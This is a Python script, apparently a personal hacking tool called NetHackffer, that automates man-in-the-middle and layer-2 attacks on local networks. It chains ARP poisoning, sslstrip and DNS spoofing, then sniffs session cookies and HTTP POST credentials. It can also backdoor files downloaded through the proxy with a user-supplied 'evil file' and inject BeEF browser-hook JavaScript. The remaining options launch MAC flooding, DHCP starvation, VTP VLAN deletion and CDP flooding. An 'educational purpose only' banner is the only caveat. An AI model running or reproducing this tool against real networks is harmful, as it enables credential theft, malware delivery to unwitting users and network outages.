#!/usr/bin/env python

import os
import time
import os.path
import colorama 
from colorama import Fore, Back , Style
import argparse
import atexit
import subprocess
import multiprocessing
import json


def exit_handler():
    print("Exiting script")
    os.system("sudo iptables --flush -t nat")
atexit.register(exit_handler)


parser = argparse.ArgumentParser(description="NetHackffer is a script that automate post network attacks")
parser.add_argument('interface',help="type the interface to work on")
parser.add_argument('user',help="type your home user not root")

args=parser.parse_args()

os.system("clear")
os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
lol = "lolcat"
sniff = (f'xterm -bg black -fg red -geometry 120x30-0+0 -T COOKIES.SNIFFING -e hamster-sidejack & sudo driftnet -i {args.interface} & xterm -bg black -fg blue -geometry 120x30-0-0 -T POST.SNIFFING -e tshark -i {args.interface} -d tcp.port==80,http -Y "http.request.method == POST" -V')

 
def FIREFOX_proxy():
    file_path = f'/home/{args.user}/.mozilla/firefox/*.nethackffer/user.js'
    if os.path.exists(file_path):
        os.system(f'su -c "firefox http://127.0.0.1:1234 -P nethackffer" {args.user}')
        pass
    else:
        os.system(f'su -c "firefox -CreateProfile nethackffer" {args.user}')
        os.system(f'cp user.js /home/{args.user}/.mozilla/firefox/*.nethackffer')
        os.system(f'su -c "firefox http://127.0.0.1:1234 -P nethackffer" {args.user}')
        pass
        

def dns():
    
    print("start spoofing attack ..")
    time.sleep(3)
    os.system(f"xterm -bg black -fg yellow -geometry 120x30+0-0 +j -T SPOOFING_DNS -e sudo ettercap -T -q -M arp:remote -P dns_spoof -P autoadd -P sslstrip -i {args.interface} -S /// & "+sniff) 

def discover():
    print(Style.BRIGHT+"""START DISCOVRING TARGETS ..
        
        """)
    time.sleep(2)
    os.system(f"sudo netdiscover -i {args.interface} -P -r {range_}")
    print("")
    print(Fore.GREEN+Style.BRIGHT+"ENTER THE TARGETS IP ADDRESS (split with [ / ])")


GREEN = '\033[92m'       # Green
ART = f"""{GREEN}
                 ███╗   ██╗███████╗████████╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗███████╗███████╗██████╗ 
                 ████╗  ██║██╔════╝╚══██╔══╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔════╝██╔════╝██╔══██╗
                 ██╔██╗ ██║█████╗     ██║   ███████║███████║██║     █████╔╝ █████╗  █████╗  █████╗  ██████╔╝
                 ██║╚██╗██║██╔══╝     ██║   ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗
                 ██║ ╚████║███████╗   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║     ██║     ███████╗██║  ██║
                 ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝                                                                                      
"""
print(f"{ART}")

os.system(f"figlet -f digital -c '                                           By Hamza Mourid' | lolcat")




code = "'\e[31m\e[5m                  ⮜! This Tool is Only For Educational Purpose Please Do not Use it For illegal Activity !⮞ \e[25m'"
os.system(f"echo {code}")
time.sleep(2)

print(Fore.BLUE + Style.BRIGHT + '''
                      *================================================================================*
                      |                            ⬲|CHOICE YOUR ATTACK|⟴                              |
                      *================================================================================*
                      |                                                                                |
                      |                                                                                |
                      |  [1]: Mitm & BACKDOOR DOWNLOADED FILES IN THE Fly & SNIFFING                   |
                      |  [2]: ARP_DNS SPOOFING & SNIFFING                                              |
                      |  [3]: Mitm & INJECTING Beef js code                                            |
                      |  [4]: Mitm ATTACK & SNIFFING                                                   |
                      |  [5]: Switch MAC flooding                                                      |
                      |  [6]: DHCP starvation Attack                                                   |
                      |  [7]: DOS attack deleting all VTP vlans                                        |
                      |  [8]: DOS attack flooding CDP table                                            |
                      |                                                                                |
                      *================================================================================*
''' + Style.RESET_ALL)
print(Fore.CYAN+"")

code1 = "\e[34m\e[5m┤►►   \e[25m"
choice = input(subprocess.check_output(f"echo '{code1}'", shell=True).decode().rstrip())
os.system("clear")
#arp_spoofing

if choice == "4":
    print(Fore.MAGENTA+Style.BRIGHT+"[1]:ATTACK FULL NETWORK   ")
    print(Fore.MAGENTA+Style.BRIGHT+"[2]:ATTACK A SPECIFIC TARGETS ")
    print("")
    choice_= str(input("choice ┤►► "))
    os.system("clear")
    if choice_ == "1":
        def all_arp():
            os.system(f"xterm -bg black -fg white -geometry 120x30+0-0 +j -e sudo ettercap -T -q -M arp:remote -P autoadd -P sslstrip -S -i {args.interface} /// & sleep 2 && "+sniff)
            time.sleep(3)
        process1 = multiprocessing.Process(target=all_arp)
        process2 = multiprocessing.Process(target=FIREFOX_proxy)
        process1.start()
        process2.start()
        
    elif choice_ == "2":
        print(Fore.RESET+Style.BRIGHT+"ENTER A SUBNET RANGE LIKE >> 192.168.0.0/24")
        print("")
        range_=str(input("RANGE ┤►► "))
        os.system("clear")
        discover()
        add =input("IP ADD ┤►► ")
        def specific_arp():
            os.system(f"xterm -bg black -fg white -geometry 120x30+0-0 +j -e sudo ettercap -T -q -M arp:remote -P autoadd -P sslstrip -S -i {args.interface} /{add}/// & "+ sniff)
            time.sleep(3)
        process1 = multiprocessing.Process(target=specific_arp)
        process2 = multiprocessing.Process(target=FIREFOX_proxy)
        process1.start()
        process2.start()
#dns_spoofing

elif choice == "2":
    print("")
    print(Style.BRIGHT+"[1]:SPOOF ALL THE NETWORK")
    print(Style.BRIGHT+"[2]:SPOOF SPECIFIC TARGETS")
    print("")
    choice__= str(input("choice ┤►► "))
    os.system("clear")
    if choice__=="1":
        siteadd = str(input("SITE ADDRESS IP  ┤►► "))      
        with open("/etc/ettercap/etter.dns","r") as f:
            for line in f:
                pass
                
        same = "*.*.*"        
        if same in line:
            os.system(f"""sudo sed -i "$ d" /etc/ettercap/etter.dns >> /etc/ettercap/etter.dns && sudo echo '*.*.*   A {siteadd} 9999' >> /etc/ettercap/etter.dns""")
            process1 = multiprocessing.Process(target=dns)
            process2 = multiprocessing.Process(target=FIREFOX_proxy)
            process1.start()
            time.sleep(3)
            process2.start()
        else:
            os.system(f"""sudo echo '*.*.*   A {siteadd} 9999' >> /etc/ettercap/etter.dns """)       
            process1 = multiprocessing.Process(target=dns)
            process2 = multiprocessing.Process(target=FIREFOX_proxy)
            process1.start()
            process2.start()
            time.sleep(3)
            
    elif choice__=="2":
        print(Fore.BLACK+Style.BRIGHT+"ENTER A RNAGE LIKE >> 192.168.0.0/24")
        print("")
        range_=str(input("RANGE  ┤►► "))
        os.system("clear")
        discover()
        print("")
        addr =input("IP ADD  ┤►► ")
        os.system("clear")
        time.sleep(3)
        def dn_s():
            os.system(f"xterm -bg black -fg white +j -geometry 120x30+0-0 -e sudo ettercap -Tq -M arp:remote -S -P dns_spoof -P autoadd -P sslstrip -i {args.interface} /{addr}/// &" + sniff)
            time.sleep(3)
        process1 = multiprocessing.Process(target=dn_s)
        process2 = multiprocessing.Process(target=FIREFOX_proxy)
        process1.start()
        process2.start()

elif choice == "3":
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 & sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
    print("")
    print("[1] ATTACK FULL NETWORK")
    print("[2] ATTACK SPECIFIC TARGETS")
    print("")
    choice1 = str(input("choice ┤►► "))
    os.system("clear")
  
    if choice1 == "1":
        print('beef user      [beef] \nbeef password  [beef] \nopen this link: http://127.0.0.1:3000/ui/panel')
        os.system(f"""sudo xterm -bg black -fg white +j -geometry 120x30+0-0 -T ARP.poisoning -e sudo ettercap -Tq -M arp:remote -P autoadd -i {args.interface} -S /// & sudo xterm -bg black -fg green +j -geometry 120x30-0-0 -T Beef -e beef-xss & su -c 'xterm -bg black -fg blue +j -geometry 120x30-0+0 -T Mitmdump.Proxy -e ./mitmproxy --mode transparent --script sslstrip.py--script replace.py' {args.user}""")
    elif choice1 == "2":
        print(Fore.RED+Style.BRIGHT+"ENTER A RANGE SUBNET LIKE >> 192.168.0.0/24")
        print("")
        range_= str(input("RANGE  ┤►► "))
        os.system("clear")
        discover()
        print("")
        addr1 =input("Targets IP Addresses use '/' to separe  ┤►► ")
        os.system("clear")
        print('beef user      [beef] \nbeef password  [beef] \nopen this link: http://127.0.0.1:3000/ui/panel')
        os.system(f"""sudo xterm -bg black -fg white +j -geometry 120x30+0-0 -T ARP.poisoning -e sudo ettercap -Tq -M arp:remote -P autoadd -i {args.interface} -S /{addr1}// & sudo xterm -bg black -fg yellow +j -geometry 120x30-0-0 -T Beef -e beef-xss & su -c 'xterm -bg black -fg blue +j -geometry 120x30+0+0 -T Mitmdump.Proxy -e ./mitmproxy --mode transparent --script sslstrip.py --script replace.py' {args.user}""")
        os.system(f'')
        time.sleep(3)





elif choice == "1":
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 & sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
    while True:
        path = str(input("ENTER THE PATH FOR YOUR EVIL FILE ┤►► "))
        if os.path.exists(path):
            os.system("clear")
            break
        else:
            print("Path does not exist. Please try again.")

    dir_path = os.path.dirname(path)
    evil_file = os.path.basename(path)
    # Define the dictionary with the configuration data
    config_data = {
        "info": {
            "evil_file": "evil_file.exe",
            "path": "/var/www/html/evil_file.exe"
        }
    }

# Update the values of the "evil_file" and "path" keys

    config_data["info"]["evil_file"] = evil_file
    config_data["info"]["path"] = dir_path

# Write the updated configuration data to a file in JSON format
    with open("config.json", "w") as f:
        json.dump(config_data, f, indent=4) 
    print("")
    print("[1] ATTACK FULL NETWORK")
    print("[2] ATTACK SPECIFIC TARGETS")
    print("")
    choice1 = str(input("choice ┤►► "))
    os.system("clear")
  
    if choice1 == "1":
        os.system(f"""sudo xterm -bg black -fg white +j -geometry 120x30+0-0 -T ARP.poisoning -e sudo ettercap -Tq -M arp:remote -P autoadd -i {args.interface} -S /// & sudo xterm -bg black -fg green +j -geometry 120x30-0-0 -T mitmproxy -e ./mitmdump -s sslstrip.py -s mitmproxy_script.py  --mode transparent & xterm -bg black -fg blue +j -geometry 120x30-0+0 -T http.server -e python -m http.server 8000 --directory /tmp""")
    elif choice1 == "2":
        print(Fore.RED+Style.BRIGHT+"ENTER A RNAGE SUBNET LIKE >> 192.168.0.0/24")
        print("")
        range_=str(input("RANGE  ┤►► "))
        os.system("clear")
        discover()
        print("")
        addr1 =input("Targets IP Addresses use '/' to separe  ┤►► ")
        os.system("clear")
        os.system(f"""sudo xterm -bg black -fg white +j -geometry 120x30+0-0 -T ARP.poisoning -e sudo ettercap -Tq -M arp:remote -P autoadd -i {args.interface} -S /{addr1}// & sudo xterm -bg black -fg green +j -geometry 120x30-0-0 -T mitmproxy -e ./mitmdump -s sslstrip.py -s mitmproxy_script.py  --mode transparent & xterm -bg black -fg blue +j -geometry 120x30-0+0 -T http.server -e python -m http.server 8000 --directory /tmp""")
        os.system(f'')
        time.sleep(3)

elif choice == "5":
    os.system(f"sudo xterm -bg black -fg white +j -geometry 120x30+0-0 -T mac_flooding -e sudo macof -i {args.interface}") 
elif choice == "6":
    os.system(f"sudo xterm -bg black -fg white +j -geometry 120x30+0-0 -T DHCP_STARVATION -e yersinia dhcp -attack 1 -interface {args.interface}")
elif choice == "7":
    os.system(f"sudo xterm -bg black -fg white +j -geometry 120x30+0-0 -T Attack_VTP -e yersinia vtp -attack 1 -interface {args.interface}")
elif choice == "8":
    os.system(f"sudo xterm -bg black -fg white +j -geometry 120x30+0-0 -T Attack_CDP -e yersinia cdp -attack 1 -interface {args.interface}")
else:
    quit()
